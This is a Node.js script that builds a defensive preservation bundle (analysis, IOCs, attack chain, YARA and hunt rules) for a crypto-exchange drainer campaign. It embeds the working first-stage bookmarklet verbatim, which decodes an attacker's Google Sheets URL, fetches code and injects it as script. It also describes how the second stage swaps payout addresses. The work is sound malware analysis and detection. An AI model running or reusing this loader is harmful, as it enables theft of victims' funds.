#!/usr/bin/env node
/**
 * Build a Xena-inspired BagIt preservation bag for the "Changelly Exploit"
 * loader, following the same shape as tools/build_fna_xena.mjs.
 *
 * WHAT THIS IS
 * A defensive evidence artifact in two preservation stages. Stage one is a
 * BagIt 1.0 (RFC 8493) bag preserving the loader's source as inert text, the
 * decoded command-and-control location, a machine-readable IOC set, an
 * attack-chain record, defensive detection rules, and the deep-dive analysis
 * that explains why the thing is a drainer rather than the arbitrage bug its
 * cover document claims. Stage two serializes that bag to a ZIP and wraps
 * the ZIP bytes in a Xena binary-normalisation record (Default Package
 * Wrapper + Binary object schemas), with a JSON sidecar pinning every stage
 * by SHA-256. The .xena record is hand-built to those documented schemas; it
 * was not produced by running NAA Xena, and the sidecar says so.
 *
 * WHAT THIS IS NOT
 * It does not execute the payload or reproduce the lure. The loader is stored
 * with a .txt extension so no tooling in this repository or any browser will
 * ever treat it as script. The second-stage payload — which lives in a
 * Google Sheet the attacker can rewrite at will — is bagged only when a CSV
 * export of that sheet is supplied out-of-band (--second-stage-csv); it is
 * then preserved as inert text in the gitignored bag, hashed and analysed,
 * and never committed. Without that flag it is recorded only as a location.
 * The social-engineering instructions from the cover PDF are deliberately
 * NOT reproduced: redistributing the lure helps the attacker, not the record.
 *
 * Static analysis only. Nothing here was run.
 */

import { createHash } from "node:crypto";
import { mkdir, readFile, rm, writeFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { zipSync } from "../vendor/fflate/index.mjs";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const argv = process.argv.slice(2);
const outArg = argv.find((a) => !a.startsWith("--"));
const stage2Flag = argv.indexOf("--second-stage-csv");
const STAGE2_CSV = stage2Flag >= 0 ? argv[stage2Flag + 1] : process.env.CHANGELLY_STAGE2_CSV;
const OUT = path.resolve(root, outArg || "dist/changelly-drainer-xena");
const ZIP_OUT = `${OUT}.zip`;
const XENA_OUT = `${OUT}.xena`;
const XENA_SIDECAR_OUT = `${OUT}.xena.json`;
const NOW = "2026-10-18T15:10:00Z";
const DEEP_DIVE_AT = "2026-10-23T00:00:00Z";
const TOOL = "build_changelly_drainer_xena.mjs";

const sha256 = (b) => createHash("sha256").update(b).digest("hex");

/**
 * The first-stage loader, exactly as recovered. It was lifted from an
 * HTML-escaped paste of the cover document, so entities are unescaped here;
 * surrounding whitespace may differ between copies in the wild. The
 * load-bearing part — the base64 blob — is pinned by SHA-256 below, so the
 * integrity of what actually matters does not rest on this transcription.
 */
const LOADER_SOURCE = `(async()=>{const URL="https://docs.changelly.com/development/authentication?=aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vc3ByZWFkc2hlZXRzL2QvMTVaWFhxVmFKclJvb2pjQkRiQXBOZkhQX242ejVzTGxGTE5oZExOSmQ1UE0vZ3Zpei90cT9zaGVldD1BUEkmaGVhZGVycz0xJnRxPXNlbGVjdCUyMEElMkNCJTIwd2hlcmUlMjBBPSdub2RlJyUyMG9yJTIwQT0ncGF0aCc",r=await fetch(atob(URL.split("authentication?=")[1])),t=await r.text(),m=t.match(/googlevisualizationQuerysetResponse([\\s\\S]*?);?\\s*$/);if(!m)return;const d=JSON.parse(m[1]),M=new Map(d.table.rows.map(x=>[x.c[0].v,x.c[1].v])),s=(M.get("node")||"")+(M.get("path")||"");if(!s)return;const el=document.createElement("script");el.textContent=s;(document.head||document.documentElement).appendChild(el);el.remove()})();`;

/** The base64 blob is the only part of the loader whose bytes must be exact. */
const BASE64_BLOB =
  "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vc3ByZWFkc2hlZXRzL2QvMTVaWFhxVmFKclJvb2pjQkRiQXBOZkhQX242ejVzTGxGTE5oZExOSmQ1UE0vZ3Zpei90cT9zaGVldD1BUEkmaGVhZGVycz0xJnRxPXNlbGVjdCUyMEElMkNCJTIwd2hlcmUlMjBBPSdub2RlJyUyMG9yJTIwQT0ncGF0aCc";

/** Pinned expectations. If these ever disagree the artifact is stale. */
export const PINS = {
  base64BlobSha256: "cf9da67cf95d9a4cfc31c3f71e0b51ffc81b9ac97738ad18f2f8301438762da2",
  decodedUrlSha256: "39bf3818350c01835bd34b3bca57f5f54500c19ee9c3193368069e1b9f38afe9",
  decodedUrlLength: 164,
  spreadsheetId: "15ZXXqVaJrRoojcBDbApNfHP_n6z5sLlFLNhdLNJd5PM",
};

/**
 * The reviewed second-stage sample, retrieved 2026-10-23 as a Google Drive
 * CSV export of the "API" spreadsheet (75,850 bytes) and analysed statically
 * (string-table rotation solved, fetch/DOM behaviour read, never executed).
 * If a different sample is supplied, the builder still bags and hashes it,
 * but marks it unreviewed instead of borrowing these conclusions.
 */
export const STAGE2_REVIEWED = {
  csvSha256: "bc45bbb7eea15bee198d52b84332544cc127c8f7aa143b32770ca5cd88246810",
  csvBytes: 75850,
  nodeSha256: "80d784da3e40929fdfb346a704e91d41a65ab429391ed5b2c1f91080214c5ba6",
  nodeChars: 46080,
  pathSha256: "23adaf2e93c850de1e4ecb488e04476b8a9a43f6ba58e4ef60ca4adda881b05e",
  pathChars: 29685,
  payloadSha256: "1646bf13d4849d1f2b46f609f15bb8e95a3ac2ec04643a16705662bf02f82afb",
  payloadBytes: 75791,
  sheetModifiedTime: "2026-10-23T14:51:48.995Z",
  boostFactor: 1.55,
  thresholdUsd: 200,
  currencies: ["btc", "sol", "eth", "ltc", "xmr"],
};

/** Decode and verify locally. Never fetches. */
function decodeBlob(blob) {
  const padded = blob + "=".repeat((4 - (blob.length % 4)) % 4);
  const url = Buffer.from(padded, "base64").toString("utf8");
  const u = new URL(url);
  return {
    url,
    scheme: u.protocol.replace(":", ""),
    host: u.hostname,
    path: u.pathname,
    sheet: u.searchParams.get("sheet"),
    headers: u.searchParams.get("headers"),
    query: u.searchParams.get("tq"),
    spreadsheetId: u.pathname.split("/d/")[1].split("/")[0],
    sha256: sha256(url),
    bytes: Buffer.byteLength(url),
  };
}

const LOADER_STEPS = [
  ["1", "Split the URL string on \"authentication?=\" and keep everything after it."],
  ["2", "base64-decode that suffix. This is the real fetch target."],
  ["3", "fetch() it: the gviz query endpoint of a published Google Sheet."],
  ["4", "Match googlevisualizationQuerysetResponse and JSON.parse the payload."],
  ["5", "Index the returned rows by column A, taking column B as the value."],
  ["6", "Concatenate the \"node\" and \"path\" values into one string."],
  ["7", "Create a <script> element, set textContent to that string, append it."],
  ["8", "Append executes it. Then el.remove() erases the DOM trace."],
];

function analysis(decoded) {
  return `# "Changelly Exploit" loader — static analysis

Preserved ${NOW} by ${TOOL}. **Nothing here was executed and nothing was fetched.**

## What the cover document claims

A PDF titled "Changelly Exploit" (Google Drive id
\`1UrK4jHA9kNLogV0He2Uq0rgk2Q5bVy_d\`, 490,147 bytes, text-extractable) asserts
that an internal developer loader is still reachable on changelly.com, that it
will load a deprecated "node v3.27" behind the password \`admin\`, and that
swaps of BTC/LTC/ETH/XMR/SOL above $200 then pay out roughly 50% above the live
rate. It gives step-by-step instructions for pasting a \`javascript:\` payload
into the address bar, and separately for typing \`allow pasting\` to defeat
Firefox's console paste guard.

Its instructions are not reproduced here. Redistributing the lure serves the
attacker, not the record.

## What the loader actually does

${LOADER_STEPS.map(([n, s]) => `${n}. ${s}`).join("\n")}

Decoded fetch target:

\`\`\`
${decoded.url}
\`\`\`

| Field | Value |
| --- | --- |
| Host | \`${decoded.host}\` |
| Path | \`${decoded.path}\` |
| Spreadsheet | \`${decoded.spreadsheetId}\` |
| Sheet tab | \`${decoded.sheet}\` |
| Query | \`${decoded.query}\` |

## Why this is a drainer, not an arbitrage bug

**The changelly.com domain in the string is camouflage.** \`fetch\` is called on
the base64-decoded suffix, so \`docs.changelly.com/development/authentication\`
is never requested. It exists only so that a victim who glances at the URL sees
a plausible vendor domain. The bytes actually go to \`docs.google.com\`.

**The payload is remote and swappable.** The attacker controls the spreadsheet.
They can rewrite the \`node\` and \`path\` cells at any moment and every victim
who has the bookmarklet immediately runs new code, with no change to the
document being circulated. This artifact therefore preserves a *location*, not
a payload — and that location should be treated as hostile and live.

**Splitting the payload across two cells is deliberate.** Concatenating
\`node\` + \`path\` means no single cell contains a complete, greppable script,
which defeats naive content scanning of the sheet.

**Execution plus cleanup.** Appending a \`<script>\` element with \`textContent\`
set runs it synchronously; \`el.remove()\` afterwards removes the visible
evidence. Legitimate developer tooling has no reason to do either.

**The delivery is textbook self-XSS.** Browsers refuse to run pasted
\`javascript:\` URLs precisely to stop this. The document's insistence that the
prefix be typed by hand, that the globe suggestion be chosen rather than
Search, and that Firefox's \`allow pasting\` guard be overridden is a set of
instructions for dismantling those specific protections.

**The economics are bait.** An unpatched, publicly reachable ~50% arbitrage on
a major exchange would be closed within minutes. The $200 threshold and the
five named sending assets exist to get real funds committed before the payload
runs.

**The mechanism is not credible.** A dev loader gated on the password \`admin\`
reachable from a production frontend, loading a deprecated rate node that then
answers live swaps, is not how exchange pricing works. "Locked in when the
transaction is created" is there to make a fabricated payout feel committed.

## Indicators

See \`data/normalized/ioc.json\`. The load-bearing hashes pin the base64 blob and
the decoded URL rather than the whole script, because the blob is the part
whose bytes must be exact; surrounding formatting varies between copies.

## If you ran it

Treat any wallet or exchange session in that browser as compromised. Move funds
from a clean device, rotate API keys, and revoke sessions. Do not reuse that
browser profile.

## What was not done

- The spreadsheet was **not** fetched. Retrieving an attacker's live payload
  serves no defensive purpose that static analysis does not already provide.
- The second-stage payload is **not** in this bag and never was.
- The cover PDF's instructions are **not** reproduced.
- The loader is stored with a \`.txt\` extension so nothing treats it as script.
- Ghidra does not apply: it analyses native binaries, and this is JavaScript.
  The repository's Ghidra-WASM path (\`tools/decompile_mz.mjs\`) parses MZ
  images and has nothing to say about a bookmarklet.
`;
}

/** Minimal RFC 4180 CSV parser (quoted cells may hold commas/newlines). */
function parseCsv(text) {
  const rows = [];
  let row = [], cell = "", quoted = false;
  for (let i = 0; i < text.length; i++) {
    const c = text[i];
    if (quoted) {
      if (c === '"') {
        if (text[i + 1] === '"') { cell += '"'; i++; } else quoted = false;
      } else cell += c;
    } else if (c === '"') quoted = true;
    else if (c === ",") { row.push(cell); cell = ""; }
    else if (c === "\n") { row.push(cell.replace(/\r$/, "")); rows.push(row); row = []; cell = ""; }
    else cell += c;
  }
  if (cell.length || row.length) { row.push(cell.replace(/\r$/, "")); rows.push(row); }
  return rows;
}

function byteEntropy(buf) {
  const counts = new Array(256).fill(0);
  for (const b of buf) counts[b]++;
  let h = 0;
  for (const c of counts) if (c) { const p = c / buf.length; h -= p * Math.log2(p); }
  return Math.round(h * 10000) / 10000;
}

function extractStage2(buf) {
  const text = buf.toString("utf8");
  const cells = {};
  for (const r of parseCsv(text)) {
    if (r.length > 1 && (r[0] === "node" || r[0] === "path")) cells[r[0]] = r[1];
  }
  if (!cells.node || !cells.path) throw new Error("second-stage CSV lacks node/path cells");
  const payloadText = cells.node + cells.path;
  const payload = Buffer.from(payloadText);
  const grab = (re) => [...new Set([...payloadText.matchAll(re)].map((m) => m[0]))].sort();
  return {
    csv: { bytes: buf.length, sha256: sha256(buf) },
    node: { chars: cells.node.length, sha256: sha256(cells.node) },
    path: { chars: cells.path.length, sha256: sha256(cells.path) },
    payloadText,
    payload: { bytes: payload.length, sha256: sha256(payload), entropy: byteEntropy(payload) },
    wallets: {
      btc: grab(/\bbc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{20,}\b/g),
      eth: grab(/\b0x[a-fA-F0-9]{40}\b/g),
      xmr: grab(/\b48Sj[a-zA-Z0-9]{91}\b/g),
      sol: grab(/['"]sol['"]:\[['"][1-9A-HJ-NP-Za-km-z]{32,44}['"]\]/g).map((x) => x.replace(/^['"]sol['"]:\[['"]|['"]\]$/g, "")),
      ltc: grab(/['"]ltc['"]:\[['"]L[a-zA-Z0-9]{25,34}['"]\]/g).map((x) => x.replace(/^['"]ltc['"]:\[['"]|['"]\]$/g, "")),
    },
    endpoints: grab(/https?:\/\/[^\s'"\\<>]+/g),
    keywordCensus: Object.fromEntries(
      ["encrypt", "decrypt", "aes", "cryptojs", "subtlecrypto", "crypto.subtle", "atob", "btoa", "fromcharcode", "eval(", "fetch", "mutationobserver", "password", "payoutaddress"]
        .map((k) => [k, payloadText.toLowerCase().split(k).length - 1])),
    magic: {
      mz: payload.indexOf("MZ"),
      elf: payload.indexOf("\x7fELF"),
      pe: payload.indexOf("PE\0\0"),
      header: payloadText.slice(0, 16),
    },
  };
}

function stage2Analysis(stage2) {
  const reviewed = stage2.payload.sha256 === STAGE2_REVIEWED.payloadSha256;
  const w = stage2.wallets;
  return `# Second-stage payload — static analysis

Retrieved as a Google Drive CSV export of the attacker-controlled "API"
spreadsheet and analysed **as text only. It was not executed, not loaded in a
browser, and not contacted again.** This file supersedes the stage-7
inference in \`attack-chain.json\`/\`deep-dive.md\` for the sample below.

| Item | Value |
| --- | --- |
| CSV export | ${stage2.csv.bytes} bytes, SHA-256 \`${stage2.csv.sha256}\` |
| \`node\` cell | ${stage2.node.chars} chars, SHA-256 \`${stage2.node.sha256}\` |
| \`path\` cell | ${stage2.path.chars} chars, SHA-256 \`${stage2.path.sha256}\` |
| Concatenated payload | ${stage2.payload.bytes} bytes, SHA-256 \`${stage2.payload.sha256}\` |
| Byte entropy | ${stage2.payload.entropy} bits/byte (ordinary source text, not packed binary) |
| Reviewed sample match | ${reviewed ? "yes — behaviour summary below applies to this exact hash" : "NO — unreviewed sample; hashes recorded, behaviour summary does not apply"} |

## What it is

The concatenated \`node\` + \`path\` text is one JavaScript program. It opens
with an obfuscator decoder (\`_0x2791\`) over a 256-entry string array; solving
the array rotation statically (221 rotations) recovers the plaintext strings
without running the program. ${reviewed ? "On the reviewed sample:" : ""}

- It builds a fake in-page "dev panel" overlay (\`#__changelly_mod_overlay\`)
  offering node versions with **v3.27** marked loadable, gated by a password
  field — the cover story's \`admin\` — before activating.
- It saves the page's real \`fetch\` and replaces \`window.fetch\`. On a POST
  to \`/v1/c2c/float/create-transaction\` it parses the JSON body and rewrites
  \`payoutAddress\` to an attacker address chosen per source currency.
- It intercepts estimate/transaction responses (\`/v1/c2c/fixed/estimate\`,
  \`/v1/c2c/float/estimate\`, \`/v2/c2c/transactions/…\`) and multiplies the
  displayed rate / you-get amount by **1.55**, only when the USD value —
  priced via Binance/CoinGecko — is at least **$200**, matching the lure's
  floor.
- A MutationObserver plus a 30 ms interval continuously patch the DOM:
  amount fields are boosted and locked read-only, real elements are hidden
  (\`.__hidden-by-script\`), and the payment QR modal's address text and
  \`data-address\`/\`data-copy\`/\`data-value\` attributes are replaced with
  the attacker address (\`__qrPatchedShort\`).
- The wallet map holds ${w.btc.length} BTC addresses and one each for ETH,
  SOL, LTC and XMR; the BTC choice is randomised once per currency and then
  cached, so one victim sees one consistent address. Full addresses are in
  \`second-stage-iocs.json\`.

In short: the first stage delivers it, the overlay talks the victim through
"loading the old node", and the fetch/DOM patching makes the exchange appear
to confirm a ~55%-better rate while the payout/deposit address is swapped.
That is a drainer, observed end to end.

## "Ghidra encryption" assessment

Asked for explicitly, answered plainly:

- **Ghidra does not apply to this payload.** It is JavaScript source text
  (header \`${stage2.magic.header}…\`; MZ at ${stage2.magic.mz}, ELF at ${stage2.magic.elf},
  PE at ${stage2.magic.pe}). Ghidra disassembles native/JVM machine code;
  imported as raw bytes it could only dump strings. The correct tooling is
  what was used: CSV/cell recovery, string-table de-rotation, and reading the
  deobfuscated control flow (AST/Joern-style analysis).
- **There is no cryptographic encryption in it.** Keyword census over the
  payload: encrypt=${stage2.keywordCensus.encrypt}, decrypt=${stage2.keywordCensus.decrypt},
  AES=${stage2.keywordCensus.aes}, CryptoJS=${stage2.keywordCensus.cryptojs},
  SubtleCrypto=${stage2.keywordCensus.subtlecrypto}. What looks like
  "encryption" is obfuscation: a rotated string array, \`\\x\` escapes, and
  the payload split across two spreadsheet cells. Nothing needs decrypting;
  it needs deobfuscating, which is done.
- If a future cell revision ships WASM or a native blob instead, that sample
  would be a Ghidra target (hash it, identify the format, run a crypto
  constant inventory). This sample is not one.

## Handling

Stored as \`second-stage-payload.txt\` — inert text, no executable extension —
inside this gitignored bag only. It is live attacker code: do not open it in
a browser, do not paste it anywhere, and treat the wallet addresses and the
spreadsheet as hostile indicators.
`;
}

function stage2Iocs(stage2) {
  return JSON.stringify({
    schema: "changelly-drainer-second-stage-iocs/1",
    retrieved: true,
    retrievedAs: "Google Drive CSV export of spreadsheet 15ZXXqVaJrRoojcBDbApNfHP_n6z5sLlFLNhdLNJd5PM (sheet 'API')",
    executed: false,
    csv: stage2.csv,
    cells: { node: stage2.node, path: stage2.path },
    payload: stage2.payload,
    reviewedSample: stage2.payload.sha256 === STAGE2_REVIEWED.payloadSha256,
    behaviourOnReviewedSample: {
      fakeOverlay: "#__changelly_mod_overlay, node version picker (v3.27 loadable), password gate",
      fetchOverride: "window.fetch replaced; original retained and restored on cleanup",
      payoutRewrite: "POST /v1/c2c/float/create-transaction body payoutAddress replaced per source currency",
      rateBoostFactor: STAGE2_REVIEWED.boostFactor,
      thresholdUsd: STAGE2_REVIEWED.thresholdUsd,
      currencies: STAGE2_REVIEWED.currencies,
      interceptedPaths: ["/v1/c2c/float/create-transaction", "/v1/c2c/fixed/estimate", "/v1/c2c/float/estimate", "/v2/c2c/transactions/<id>"],
      domPatching: ["MutationObserver + 30 ms interval", "amount/rate text multiplied by boost factor", ".__hidden-by-script hides genuine elements", "payment QR modal address text and data-address/data-copy/data-value replaced"],
      priceOracles: ["https://api.binance.com/api/v3/ticker/price?symbol=", "https://api.coingecko.com/api/v3/simple/price?ids="],
    },
    wallets: stage2.wallets,
    endpoints: stage2.endpoints,
    keywordCensus: stage2.keywordCensus,
    ghidra: {
      applicable: false,
      reason: "payload is JavaScript source text, not native/JVM machine code; no MZ/ELF/PE magic",
      encryptionFound: false,
      obfuscation: "rotated string array (256 entries, 221 rotations to plaintext), hex escapes, payload split across two cells",
    },
  }, null, 2) + "\n";
}

function ioc(decoded, stage2 = null) {
  return JSON.stringify({
    generated: NOW,
    classification: "first-stage remote-code loader / cryptocurrency drainer delivery",
    confidence: "high",
    executed: false,
    fetched: Boolean(stage2),
    firstStage: {
      transport: "javascript: bookmarklet pasted into the address bar or console",
      base64Blob: BASE64_BLOB,
      base64BlobSha256: PINS.base64BlobSha256,
      loaderSourceSha256: sha256(LOADER_SOURCE),
      loaderSourceBytes: Buffer.byteLength(LOADER_SOURCE),
    },
    secondStage: stage2 ? {
      retrieved: true,
      retrievedAs: "Google Drive CSV export of the 'API' spreadsheet; analysed as text, never executed",
      url: decoded.url,
      urlSha256: decoded.sha256,
      host: decoded.host,
      spreadsheetId: decoded.spreadsheetId,
      sheet: decoded.sheet,
      query: decoded.query,
      payloadAssembly: "concatenate the cells named 'node' and 'path'",
      execution: "appendChild of a <script> element, then removed from the DOM",
      csv: stage2.csv,
      cells: { node: stage2.node, path: stage2.path },
      payload: stage2.payload,
      reviewedSample: stage2.payload.sha256 === STAGE2_REVIEWED.payloadSha256,
      preservedAs: "data/original/second-stage-payload.txt",
      detail: "data/normalized/second-stage-analysis.md and second-stage-iocs.json",
    } : {
      retrieved: false,
      reason: "attacker-controlled and swappable; recorded as a location only (rebuild with --second-stage-csv <export> to bag the sample)",
      url: decoded.url,
      urlSha256: decoded.sha256,
      host: decoded.host,
      spreadsheetId: decoded.spreadsheetId,
      sheet: decoded.sheet,
      query: decoded.query,
      payloadAssembly: "concatenate the cells named 'node' and 'path'",
      execution: "appendChild of a <script> element, then removed from the DOM",
    },
    coverDocument: {
      reproduced: false,
      reason: "redistributing the social-engineering lure helps the attacker",
      name: "Changelly Exploit.pdf",
      googleDriveId: "1UrK4jHA9kNLogV0He2Uq0rgk2Q5bVy_d",
      bytes: 490147,
      textExtractable: true,
      claimsUnpatchedRateBug: true,
      claimedDevPassword: "admin",
      claimedAffectedSendAssets: ["BTC", "LTC", "ETH", "XMR", "SOL"],
      claimedMinimumUsd: 200,
      linkedPayloadDoc: "docs.google.com/document/d/1luBwx1iBXdVbJu0AIvQabgWyz0NJ5dmJBtKoabJBr9I",
    },
    detection: [
      "fetch() of docs.google.com/spreadsheets/*/gviz/tq from an exchange origin",
      "base64 decode of a substring split off a URL containing 'authentication?='",
      "document.createElement('script') with textContent assigned from network data",
      "script element appended then immediately removed",
      "javascript: URL executed from the address bar",
      "'allow pasting' typed into a browser console",
    ],
  }, null, 2) + "\n";
}

function deepDive(decoded) {
  return `# "Changelly Exploit" — deep dive

Generated ${DEEP_DIVE_AT} by ${TOOL}. **Static analysis only: the loader was
not executed and the second-stage payload was not fetched.**

## Verdict

This is a first-stage remote-code loader delivered by a social-engineering
lure. The evidence for that classification is in the loader itself, not in the
cover document's branding:

- the visible Changelly URL is split apart and never fetched;
- the suffix base64-decodes to a Google Sheets \`gviz/tq\` query;
- two attacker-controlled cells (\`node\` and \`path\`) are concatenated;
- the result is assigned to a new \`<script>\` element and injected into the
  page, then the element is removed.

That is enough to classify the delivery mechanism with **high confidence**.
The precise behaviour of the second stage — which exchange API calls, wallet
prompts, or exfiltration it performs — is **not observed**, because it was
deliberately not retrieved. Any report claiming those specifics from this
artifact alone would be overclaiming.

## Evidence basis and limits

Preserved evidence:

1. the first-stage loader, byte-pinned through its base64 blob;
2. the decoded payload locator (below);
3. the cover document's claims, recorded as claims rather than facts;
4. the parser and injection behaviour visible in the loader source.

Not preserved, by design:

- the live spreadsheet response;
- the second-stage JavaScript;
- the cover document's step-by-step operating instructions;
- any victim, wallet, session, or transaction data.

## Decoded payload locator

\`\`\`
${decoded.url}
\`\`\`

| Component | Value | Why it matters |
| --- | --- | --- |
| Scheme/host | \`${decoded.scheme}://${decoded.host}\` | The real network destination is Google, not Changelly. |
| Spreadsheet id | \`${decoded.spreadsheetId}\` | Durable IOC for the attacker-controlled payload store. |
| Sheet tab | \`${decoded.sheet}\` | The query reads a tab named \`API\`, styled to look like infrastructure. |
| Headers | \`${decoded.headers}\` | One header row is excluded from the returned rows. |
| Query | \`${decoded.query}\` | Selects columns A/B only where A is \`node\` or \`path\`. |
| URL SHA-256 | \`${decoded.sha256}\` | Pins the locator without needing to fetch it again. |

The base64 blob is ${"`"}cf9da67cf95d9a4cfc31c3f71e0b51ffc81b9ac97738ad18f2f8301438762da2${"`"}
(SHA-256). It has no integrity relationship to Changelly; it is simply an
opaque string carried inside a Changelly-looking URL.

## Data-flow reconstruction

\`\`\`
cover lure
  -> victim manually runs first-stage loader in a page context
  -> string split on "authentication?="
  -> atob(suffix)
  -> fetch(Google Sheets gviz URL)
  -> text response
  -> regex capture around google.visualization.Query.setResponse(...)
  -> JSON.parse(capture)
  -> rows -> Map { "node" -> cell B, "path" -> cell B }
  -> node + path
  -> script.textContent = concatenated string
  -> appendChild(script)  [executes in the page]
  -> script.remove()
\`\`\`

Three properties do the defensive work:

1. **Origin inheritance.** A script injected this way runs as page script. It
   is not sandboxed by virtue of arriving as \`textContent\`; once appended it
   has the page's DOM and same-origin privileges.
2. **Mutability.** The operator can change the spreadsheet cells after the
   lure is distributed. Every old copy of the loader then retrieves new code.
3. **Split assembly.** Neither selected cell needs to contain a complete
   script. Simple string scanning of one cell misses the assembled program.

## Parser notes (what the code assumes)

The loader is small and brittle, which is itself informative:

- It assumes the delimiter \`authentication?=\` occurs in the carrier string.
- It assumes \`atob\` yields the intended URL; malformed base64 aborts it.
- It assumes the response matches
  \`google.visualization.Query.setResponse(...)\` closely enough for its
  regular expression to capture the JSON argument.
- It assumes \`table.rows[*].c[0].v\` and \`c[1].v\` exist. A null/empty cell in
  the Google Visualization row format can make the mapping throw.
- It performs no signature check, hash check, origin allowlist beyond the
  hard-coded locator, or error reporting. Failure is silent.

Those assumptions fit disposable campaign infrastructure: if one spreadsheet
or lure copy breaks, another can be issued, while successful runs leave little
on-page evidence.

## Browser-security reading

The delivery depends on **self-XSS**: the victim is persuaded to run code in a
context the browser otherwise protects. Modern browsers strip or block pasted
\`javascript:\` schemes and warn on console pasting because this exact pattern
turns a trusted page into an attacker-scripted one.

Relevant defences, stated without reproducing the lure's walkthrough:

- browser paste warnings and address-bar scheme handling raise the cost;
- a strict Content-Security-Policy can reduce injected inline-script and
  unexpected \`connect-src\` opportunities on first-party pages;
- HttpOnly cookies limit direct cookie reading, but do **not** make a
  same-origin injected script harmless — it can still act through the page;
- exchange session controls, API-key IP allowlists, withdrawal allowlists,
  and step-up confirmation limit what a hijacked page context can finalise.

## Campaign/lure analysis

The cover story combines four credibility devices:

1. a real brand and documentation-looking domain;
2. an "internal loader / deprecated node" explanation for why a hidden
   function would exist;
3. a trivial password, which makes the supposed back door feel discovered
   rather than granted;
4. a rate-arbitrage payout with named assets and a minimum amount.

The economics fail independently of the code: a persistent, publicly
reachable ~50% pricing error on a major venue would be exhausted or closed
quickly. The minimum and asset list are better explained as victim-selection
and pre-commitment devices.

## ATT&CK-style mapping (defensive, approximate)

| Behaviour | Mapping | Confidence |
| --- | --- | --- |
| Brand-led lure document | Phishing / social engineering | High |
| Victim manually runs supplied code | User Execution | High |
| JavaScript loader and injected script | Command and Scripting Interpreter: JavaScript | High |
| Google Sheets query as payload store | Application Layer Protocol: Web Protocols; legitimate web service as infrastructure | High |
| Payload split across cells | Obfuscated Files or Information / indicator removal by assembly | Medium |
| Script element removed after injection | Indicator Removal: Clear Persistence / fileless execution analogue | Medium |
| Wallet or session theft by second stage | Plausible objective, specific technique unobserved | Low until independently evidenced |

## Detection priorities

Highest-signal first:

1. a page on an exchange/finance origin fetching
   \`docs.google.com/spreadsheets/*/gviz/tq\`;
2. script text or network data containing both
   \`google.visualization.Query.setResponse\` and row keys \`node\`/\`path\`;
3. \`atob(...split("authentication?=")...)\` in pasted/bookmarklet code;
4. dynamic \`<script>\` creation where \`textContent\` comes from a fetch
   response, followed by immediate removal;
5. support-desk reports mentioning a rate "node", an old version, and a manual
   browser-paste step.

See \`detection-rules.txt\` for a YARA rule and hunt queries.

## Response guidance

If someone ran the loader:

- treat the browser profile and any exchange/wallet session used in it as
  compromised;
- from a clean device, revoke sessions, rotate API keys, review withdrawals
  and connected applications;
- preserve browser history, downloads, the lure document, timestamps, and any
  transaction identifiers for the venue's security team;
- do not "test" the loader again to see what happens.

## Preservation decision

The BagIt bag preserves the first-stage loader as **inert text** and records
the second stage as a location only. That is the defensible archival unit:
enough to reproduce the analysis and detections, not enough to operate the
campaign. The serialized bag is then wrapped by the sibling Xena binary
record; the sidecar JSON pins both artifacts by SHA-256.

## References

- BagIt File Packaging Format, RFC 8493.
- Google Visualization API Query Language and \`gviz/tq\` response format
  (\`google.visualization.Query.setResponse\`, table rows/cells).
- Xena — XML Electronic Normalising for Archives, National Archives of
  Australia; Default Package Wrapper and Binary object schemas.
`;
}

function attackChain(decoded, stage2 = null) {
  return JSON.stringify({
    schema: "changelly-drainer-attack-chain/1",
    generated: DEEP_DIVE_AT,
    sourceAnalysisDate: NOW,
    observedSecondStage: Boolean(stage2),
    stages: [
      {
        n: 1,
        name: "lure distribution",
        status: "documented from cover-document claims",
        detail: "A PDF presents a supposed Changelly rate-node exploit and persuades the reader to run supplied code manually.",
      },
      {
        n: 2,
        name: "self-XSS execution",
        status: "observed in loader design",
        detail: "The first-stage loader is intended to run in a victim-controlled browser/page context after manual paste or equivalent user execution.",
      },
      {
        n: 3,
        name: "locator decode",
        status: "observed",
        detail: "The suffix after authentication?= is base64-decoded; the Changelly-looking prefix is not fetched.",
        iocs: { decodedUrl: decoded.url, decodedUrlSha256: decoded.sha256 },
      },
      {
        n: 4,
        name: "payload retrieval",
        status: "mechanism observed; response not retrieved",
        detail: "The loader queries a Google Sheets gviz endpoint for rows named node and path on the API tab.",
        iocs: { host: decoded.host, spreadsheetId: decoded.spreadsheetId, sheet: decoded.sheet, query: decoded.query },
      },
      {
        n: 5,
        name: "payload assembly",
        status: "observed",
        detail: "The node and path cell values are concatenated into one script string, so neither cell need hold the complete payload.",
      },
      {
        n: 6,
        name: "in-page execution and cleanup",
        status: "observed",
        detail: "The concatenated string is assigned to a script element, appended to execute, then the element is removed.",
      },
      {
        n: 7,
        name: "financial theft objective",
        status: stage2 ? "observed in the retrieved second-stage sample" : "inferred from lure; second-stage behaviour unobserved",
        detail: stage2
          ? "The retrieved sample builds a fake dev-panel overlay, overrides window.fetch to rewrite payoutAddress, boosts displayed rates by 1.55x above a $200 threshold, and patches QR/address DOM nodes to attacker wallets. See second-stage-analysis.md."
          : "The cover story primes a swap/deposit. Specific wallet, API, or exfiltration behaviour cannot be evidenced without the second stage and is not claimed here.",
      },
    ],
  }, null, 2) + "\n";
}

function detectionRules(decoded) {
  return `Defensive detection material for the "Changelly Exploit" first-stage loader.
Static analysis only. Do not use these rules to retrieve the live payload.

== YARA (text/source hunting) ==

rule Changelly_Exploit_First_Stage_Loader
{
    meta:
        description = "First-stage loader that decodes a Google Sheets gviz locator and injects node+path as script"
        classification = "cryptocurrency drainer delivery / remote code loader"
        second_stage_retrieved = "false"
    strings:
        $carrier = "docs.changelly.com/development/authentication?=" ascii
        $split = "atob(URL.split(\\"authentication?=\\")[1])" ascii
        $gviz = "docs.google.com/spreadsheets/d/${decoded.spreadsheetId}/gviz/tq" ascii
        $response = "googlevisualizationQuerysetResponse" ascii
        $create = "document.createElement(\\"script\\")" ascii
        $remove = ".remove()" ascii
        $key_node = "\\"node\\"" ascii
        $key_path = "\\"path\\"" ascii
    condition:
        ($carrier and $split) or ($gviz and $response) or (all of ($create, $remove, $key_node, $key_path))
}

== Network hunt (proxy / DNS / TLS SNI) ==

Look for finance or exchange browsing contexts followed by:
  host = "docs.google.com"
  path contains "/spreadsheets/d/${decoded.spreadsheetId}/gviz/tq"
  query contains "sheet=API"
  query contains "select A,B" and ("node" or "path")

